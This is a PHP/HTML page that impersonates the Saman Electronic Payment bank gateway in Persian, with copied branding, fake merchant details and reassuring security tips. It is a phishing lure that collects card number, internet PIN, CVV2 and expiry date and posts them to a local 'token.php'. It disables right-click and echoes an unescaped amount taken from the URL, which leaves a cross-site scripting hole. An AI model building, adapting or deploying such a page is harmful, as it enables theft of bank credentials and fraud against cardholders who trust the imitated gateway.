<?php
session_start();
$_SESSION = array();
		$_SESSION['amount'] = $_GET['amount'];
include("simple-php-captcha.php");
$_SESSION['captcha'] = simple_php_captcha();
?>
<!DOCTYPE html>
<html style="" class=" js flexbox flexboxlegacy canvas canvastext webgl no-touch geolocation postmessage websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface no-generatedcontent video audio localstorage sessionstorage webworkers applicationcache svg inlinesvg smil svgclippaths js flexbox flexboxlegacy canvas canvastext webgl no-touch geolocation postmessage no-websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients no-cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers applicationcache svg inlinesvg smil svgclippaths" lang="en"><head><meta charset="utf-8"><title>
	درگاه پرداخت اینترنتی پرداخت الکترونیک سامان
</title><meta name="viewport" content="width=device-width, initial-scale=1.0"><script src="js/modernizr.js"></script>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js></script>
<script src="js/test.js></script>
<style type="text/css">
        pre {
            border: solid 1px #bbb;
            padding: 10px;
            margin: 2em;
        }

        img {
            border: solid 1px #ccc;
            margin: 0 ;
        }
    </style>
    <script src="js/persian.js"></script>
<script src="js/Payment.js"></script>
    <link href="css/css.css" rel="stylesheet">
<link href="img/favicon.ico" rel="shortcut icon" type="image/x-icon"></head>
<body id="Body" class="pagebody" oncontextmenu="return false">

    <form method="POST" action="cancell.php" id="CancelForm" name="CancelForm" autocomplete="off">
        <input name="State" id="State" value="Canceled By User" type="hidden">
        <input name="StateCode" id="StateCode" value="-1" type="hidden">
        <input name="ResNum" value="7221952" type="hidden">
        <input name="MID" value="2987" type="hidden">
        <input name="RefNum" value="" type="hidden">
        <input name="CID" value="" type="hidden">
        <input name="TRACENO" value="" type="hidden">
        <input name="RRN" value="" type="hidden">
         <input name="SecurePan" value="" type="hidden">
    </form>
    <form method="post" action="token.php" id="frmMain" autocomplete="off">
<div class="aspNetHidden">

</div>

<script type="text/javascript">
//<![CDATA[
var theForm = document.forms['frmMain'];
if (!theForm) {
    theForm = document.frmMain;
}
function __doPostBack(eventTarget, eventArgument) {
    if (!theForm.onsubmit || (theForm.onsubmit() != false)) {
        theForm.__EVENTTARGET.value = eventTarget;
        theForm.__EVENTARGUMENT.value = eventArgument;
        theForm.submit();
    }
}
//]]>
</script>

<script src="js/WebResource.JS" type="text/javascript"></script>


<script src="js/MicrosoftAjax.js" type="text/javascript"></script>
<script src="js/MicrosoftAjaxWebForms.js" type="text/javascript"></script>
<div class="aspNetHidden">

	<input id="__VIEWSTATEGENERATOR" value="A8441BC6" type="hidden">
</div>
        <input id="sessionKey" type="hidden">
        <div id="wrapAll">
            <div id="wrapheader">
                <div class="top-nav">
                    <div class="container box-center">
                        <div class="contact">021-84080</div>
                    </div>
                </div>
                <div class="inner container box-center">
                    <div class="menu-container">
                        <div class=" box-center">
                            <div class="pull-left logo"></div>
                            <div class="pull-right logo-shaparak">
                            </div>
                            <div class="title">
                                <div class="title-text">
                                    درگاه پرداخت اینترنتی پرداخت الکترونیک سامان
                                </div>
                            </div>
                            <div class="clear"></div>
                        </div>

                    </div>
                </div>
            </div>
            <div id="wrapsite">
                <div id="wrapcenter">
                    <div class="container box-center">
<div class="alert alert-danger dnone" id="validatorCard">
</div>
<script type="text/javascript">
//<![CDATA[
Sys.WebForms.PageRequestManager._initialize('ctl00$mainContent$PaymentServiceIPG$sm', 'frmMain', ['tctl00$mainContent$PaymentServiceIPG$UpdatePanel1','mainContent_PaymentServiceIPG_UpdatePanel1'], [], [], 90, 'ctl00');
//]]>
</script>
<div class="holder">
    <div class="card-info box">
        <div class="header">
            <span class="moduletitle pull-right">
                <span class="icon creditcard"></span>اطلاعات کارت
            </span>
            <span class="time pull-left">
                <span class="text-right">
                    <i class="glyphicon glyphicon-time"></i>
                    زمان باقی مانده
                </span>
                <span class="timer-green TimeInput text-left" id="timer">
                    <span id="second">26</span>
                    <span id="spilit">:</span>
                    <span id="minute">09</span>
                </span>
            </span>
            <div class="clear"></div>
        </div>
        <div id="mainContent_PaymentServiceIPG_Panel1" onkeypress="javascript:return WebForm_FireDefaultButton(event, 'mainContent_PaymentServiceIPG_PayButton1')">
            <div class="form-horizontal col-md-8 col-sm-9">
                <div class="form-group">
                    <label for="CardNumber" class="control-label col-md-4 col-xs-3 col-sm-3">شماره کارت <span class="star">* </span></label>
                    <div class="col-md-8 col-xs-9 col-sm-8 input-holder">
                        <span class="panel">
                            <div id="mainContent_PaymentServiceIPG_Panel2">
                                <span>
                                    <input name="CARD1" maxlength="4" id="PAN0" tabindex="1" class="textpan PAN0 input" dir="ltr" size="4" nextelement="PAN1" type="tel">
                                </span>
                                <span>-</span>
                                <span>
                                    <input name="CARD2" maxlength="4" id="PAN1" tabindex="2" class="textpan PAN1 input" dir="ltr" size="4" nextelement="PAN2" type="tel">
                                </span>
                                <span>-</span>
                                <span>
                                    <input name="CARD3" maxlength="4" id="PAN2" tabindex="3" class="textpan PAN2 input" dir="ltr" size="4" nextelement="PAN3" type="tel">
                                </span>
                                <span>-</span>
                                <span>
                                    <input name="CARD4" maxlength="4" id="PAN3" tabindex="5" class="textpan PAN3 input" dir="ltr" size="4" nextelement="PAN4" type="tel"></span>
                                <span>-</span>
                                <span>
                                    <input name="CARD5" maxlength="3" id="PAN4" tabindex="6" class="textpan PAN4 last-pan input" dir="ltr" size="3" disabled="true" nextelement="PIN" type="tel">
                                </span>
                                <div class="clear"></div>
	</div>
                        </span>
                        <div>
                            <span id="cardnumber" class="validationerror"></span>
                        </div>
                    </div>
                    <div class="clear"></div>
                </div>
                <div class="form-group">
                    <label for="Pin2" class="control-label col-md-4 col-xs-3 col-sm-3">رمز اینترنتی <span class="star">* </span></label>
                    <div class="col-md-8 col-xs-9 col-sm-8 input-holder">
                        <input name="PASSWORD" maxlength="12" id="PIN" tabindex="7" class="pin pass form-control input" autocomplete="off" dir="ltr" nextelement="CVV" type="password">
                        <div class="clear"></div>
                        <div>
                            <span id="pinval" class="validationerror"></span>
                        </div>
                    </div>
                    <div class="clear"></div>
                </div>
                <div class="form-group">
                    <label for="Pin2" class="control-label col-md-4 col-xs-3 col-sm-3">cvv2<span class="star">* </span></label>
                    <div class="col-md-8 col-xs-9 col-sm-8 input-holder">
                        <input name="CVV2" maxlength="4" id="CVV" tabindex="8" class="cvv2 pass form-control input" autocomplete="off" dir="ltr" size="4" nextelement="ExpDateMonth" type="password">
                        <div class="clear"></div>
                        <div>
                            <span id="cvv2" class="validationerror"></span>
                        </div>
                    </div>
                    <div class="clear"></div>
                </div>
                <div class="form-group">
                    <label for="Pin2" class="control-label col-md-4 col-xs-3 col-sm-3">تاریخ انقضا <span class="star">* </span></label>
                    <div class="col-md-8 col-xs-9 col-sm-8 expire input-holder">
                        <div class="pull-right">
                            <label>ماه</label>
                            <input name="MONTH" maxlength="2" id="ExpDateMonth" tabindex="9" class="expm form-control input" dir="ltr" size="2" nextelement="ExpDateYear" type="tel">
                        </div>
                        <div class="pull-right">
                            <label class="year">سال</label>
                            <input name="YEARS" maxlength="2" id="ExpDateYear" tabindex="10" class="expy form-control input" dir="ltr" size="2" nextelement="txtSecurityCode" type="tel">
                        </div>
                        <div class="clear"></div>
                        <div>
                            <span id="month" class="validationerror"></span>
                            <span id="year" class="validationerror"></span>
                        </div>
                    </div>
                    <div class="clear"></div>
                </div>
                <div id="mainContent_PaymentServiceIPG_UpdatePanel1">

                        <div class="form-group">
                            <label class="control-label col-md-4 col-xs-3 col-sm-3">کد امنیتی<span class="star">* </span></label>
                            <div class="col-md-4 col-xs-4 col-sm-4 input-holder captcha">
                                <div id="CaptchaContainer" align="right">

        <?php
        echo '<img src="' . $_SESSION['captcha']['image_src'] . '" alt="CAPTCHA code" width="135" height="50">'; ?>
                                </div>
                            </div>
                            <div class="col-md-4 col-xs-5 col-sm-4 inpt-captcha-holder">
                                <input maxlength="6" id="txtSecurityCode" tabindex="12" class="form-control input-captcha input" nextelement="EmailUser" style="width:95px;direction: ltr;" type="tel">
                                 <a href=""><img src="img/refresh.png"></a>

                            </div>
                            <div class="clear"></div>
                            <div class="clear"></div>
                        </div>

	</div>
                <div id="mainContent_PaymentServiceIPG_panelMail">

                    <div class="form-group">
                        <label class="control-label col-md-4 col-xs-3 col-sm-3">ایمیل(اختیاری)</label>
                        <div class="col-md-8 col-xs-9 col-sm-8 input-holder">
                            <input name="EMAIL" id="EmailUser" tabindex="11" class="form-control mail input" style="direction: ltr;" type="email">
                            <div>
                                <span id="email" class="validationerror"></span>
                            </div>
                        </div>
                        <div class="clear"></div>
                    </div>

	</div>
                <div class="form-group">
                    <label class="control-label col-md-4 col-xs-3 col-sm-3"></label>
                    <div class="col-md-8 col-xs-8 col-sm-8">
                        <input value="پرداخت" onclick="return isValid();WebForm_DoPostBackWithOptions(new WebForm_PostBackOptions(&quot;ctl00$mainContent$PaymentServiceIPG$PayButton1&quot;, &quot;&quot;, true, &quot;&quot;, &quot;&quot;, false, false))" id="mainContent_
                        ServiceIPG_PayButton1" class="btn btn-primary payment btn-payment" type="submit">
                        <input id="btnPayProgreess" value="در حال پردازش" class="btn btn-success" disabled="disabled" type="button">
                        <input name="Cancel" id="cancel" class="btn btn-danger" onclick="document.getElementById('CancelForm').submit()" value="انصراف" type="button">
                    </div>
                </div>
            </div>
            <div class="col-md-4 col-sm-3 keypad-holder">
                <div id="VirtualKey" class="keypad">
                    <input id="btn1" onclick="input(this);" value="7" type="button">
                    <input id="btn2" onclick="input(this);" value="2" type="button">
                    <input id="btn3" onclick="input(this);" value="4" type="button">
                    <br>
                    <input id="btn4" onclick="input(this);" value="0" type="button">
                    <input id="btn5" onclick="input(this);" value="6" type="button">
                    <input id="btn6" onclick="input(this);" value="5" type="button">
                    <br>
                    <input id="btn7" onclick="input(this);" value="3" type="button">
                    <input id="btn8" onclick="input(this);" value="9" type="button">
                    <input id="btn9" onclick="input(this);" value="8" type="button">
                    <br>
                    <input id="btn0" onclick="input(this)" value="1" type="button">
                    <input id="btnDel" value="اصلاح" onclick="del();" class="lg-input" type="button">
                    <input id="btnRemove" value="حذف" class="lg-input" onclick="Remove();" type="button">
                </div>

            </div>
            <div class="clear"></div>

</div>
    </div>
    <div class="merchant-info box">
        <div class="header">
            <span class="moduletitle text-right">

                <span class="icon info-sign"></span>اطلاعات پذیرنده
            </span>
        </div>
        <div class="img-holder">
            <table class="fixed" align="center">
                <tbody><tr>
                    <td>
                        <img id="mainContent_PaymentServiceIPG_Image1" src="samanBank.png">
                    </td>
                </tr>
            </tbody></table>
        </div>
        <div style="clear: both;">
            <div class="merchant-name">
                <span class="icon user"></span>
                <span class="editor-label">نام پذیرنده:</span>
                <span id="mainContent_PaymentServiceIPG_lbl_name" style="color:DarkRed;">پرداخت الکترونیک پی منت</span>
            </div>
            <div class="merchant-site">
                <span class="icon url"></span>
                <span class="editor-label">آدرس سایت پذیرنده:</span>
                <span id="mainContent_PaymentServiceIPG_lbl_merchantSite" class="adressUrl" style="color:DarkRed;">shaparak.ir</span>
            </div>
            <div class="merchant-code">
                <span class="icon ok"></span>
                <span class="editor-label">کد پذیرنده:
                </span>
                <span id="mainContent_PaymentServiceIPG_lbl_termid" style="color:DarkRed;">10798163</span>
            </div>
            <div class="merchant-amount">
                <span class="icon starcertificate"></span>
                <span class="editor-label">مبلغ قابل پرداخت :
                </span>
                <font color="#8b0000">
                <?php echo $_SESSION["amount"]; ?>
                 ریال</font>
            </div>
        </div>
    </div>
    <div class="security-info box col-xs-12 col-sm-12 col-md-12">
        <div class="header">
            <sapn class="moduletitle text-right">
                <span class="icon exclamation-sign"></span>

        نکات امنیتی
    </sapn>
        </div>
        <div class="security-description">
            <p>
                <span class="icon securitytik"></span>
                درگاه پرداخت اینترنتی سامان با استفاده از پروتکل امن SSL  به مشتریان خود ارایه خدمت نموده و با آدرس  شروع می شود. خواهشمند است به منظور جلوگیری از سوء استفاده های احتمالی پیش از ورود هرگونه اطلاعات، آدرس موجود در بخش مرورگر را چک بفرمایید.
            </p>
            <p>
                <span class="icon securitytik"></span>

                از صحت نام فروشنده و مبلغ نمایش داده شده، اطمینان حاصل فرمایید.
            </p>
            <p>
                <span class="icon securitytik"></span>

                رای جلوگیری از افشای رمز کارت خود، حتی المقدور از صفحه کلید مجازی استفاده فرمایید.
            </p>
            <p>
                <span class="icon securitytik"></span>

                برای کسب اطلاعات بیشتر، گزارش فروشگاههای مشکوک و همچنین اطلاع از وضعیت پذیرندگان اینترنتی با شماره 84080 تماس بگیرید و یا از طریق ایمیل epay@sep.ir اقدام نمایید.
            </p>

        </div>
    </div>
</div>
                    </div>
                    <div class="clear"></div>
                </div>
                <div class="divWaiting" style="display: none" id="loading">
                    <span id="lblWait"></span>
                </div>
            </div>
            <div style="margin-top:131px" id="wrapBottom">
                <div class="pull-right text-right">
                    تمامی حقوق این نرم افزار متعلق به شرکت پرداخت الکترونیک سامان می باشد.
                </div>
                <div class="pull-left text-left">
                    شرکت پرداخت الکترونیک سامان <span style="direction: rtl;">2008 - 2017</span>
                </div>
                <div class="clear"></div>
            </div>
            <div class="clear"></div>
        </div>
    </form>




</body></html>
